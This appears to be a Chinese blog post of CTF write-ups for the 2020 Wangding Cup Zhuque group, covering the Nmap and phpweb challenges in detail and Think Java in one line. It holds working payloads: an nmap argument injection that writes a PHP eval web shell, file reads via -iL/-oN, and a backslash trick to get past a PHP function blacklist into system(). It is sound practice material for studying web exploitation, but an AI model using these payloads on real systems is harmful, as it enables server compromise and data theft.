+++
title = "网鼎杯2020朱雀组"
slug = "wangding-cup-2020-zhuque-group"
description = "刷"
date = "2024-08-23T09:23:00"
lastmod = "2024-08-23T09:23:00"
image = ""
license = ""
categories = ["复现"]
tags = []
+++

# [网鼎杯 2020 朱雀组]Think Java

java代审

# [网鼎杯 2020 朱雀组]Nmap

```
nmap -oG 写入文件 
nmap -iL读取扫描文件
```

黑盒但是随便测测应该就可以绕过了

```
127.0.0.1'<?=eval($_POST[a]);?> -oG shell.php'
Hacker...

127.0.0.1'<?=eval($_POST[a]);?> -oG shell.phtml'
发现并没有写成功,估计还有什么其他的东西

127.0.0.1' <?=eval($_POST[a]);?> -oG shell.phtml '
这个成功了，那么猜测后端应该是有个escapeshellarg
```

```
http://7ae0ff86-ac34-4c5d-bde7-b6a40ce2818e.node5.buuoj.cn:81/shell.phtml

POST:
a=echo `tac /flag`;
```

当然还可以读取文件

```
127.0.0.1' -iL /flag -oN /var/www/html/flag.txt '

127.0.0.1' -iL /flag -oN test.txt '
```

访问`flag.txt`即可(路径没关系都可以)

# [网鼎杯 2020 朱雀组]phpweb

抓包发现参数

```
POST /index.php HTTP/1.1
Host: 3c6b16ed-e525-485c-9917-8e10478e0800.node5.buuoj.cn:81
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Origin: http://3c6b16ed-e525-485c-9917-8e10478e0800.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://3c6b16ed-e525-485c-9917-8e10478e0800.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

func=file_get_contents&p=index.php
```

得到源码

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

很容易就绕过了，随便测试一下

```
func=\system&p=find / -type f -name "f*"
找到这几个
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/tmp/flagoefiu4r93

func=\system&p=tac /tmp/flagoefiu4r93
```

成功
